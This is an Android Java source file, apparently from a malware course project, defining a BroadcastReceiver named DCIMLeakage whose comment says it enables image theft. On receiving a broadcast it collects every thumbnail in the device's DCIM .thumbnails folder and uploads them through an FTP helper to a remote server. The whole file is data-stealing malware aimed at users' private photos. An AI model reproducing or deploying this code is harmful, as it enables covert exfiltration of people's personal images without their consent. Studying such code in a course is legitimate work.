package com.malwareclass.malwareproject;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Environment;
import android.util.Log;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;

/**
 * Permette il furto delle immagini
 * DA CONSIDERARE: immagine full-size o scalata o thumbnail?
 */
public class DCIMLeakage extends BroadcastReceiver {
    private static final String TAG = "DCIMLeakage";

    @Override
    public void onReceive(Context context, Intent intent) {

        // TODO
        Log.d(TAG, "Started");

        // call method to leake thumbnails
        thumbnailsLeakage();
    }

    private void thumbnailsLeakage(){
        // path to .thumbnails dir
        String path = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getPath()
                + "/.thumbnails/";

        // thumbnails directory
        File thumbnailsDir = new File(path);

        // get all thumbnails
        File[] thumbnails = thumbnailsDir.listFiles();

        // if there are some thumbnails, start to uplaod
        if ( thumbnails!=null && thumbnails.length>0 ){
            // get a FTP instance
            FTP ftp = FTP.getInstance();
            // start upload
            ftp.upload(thumbnails);
        }
    }

}
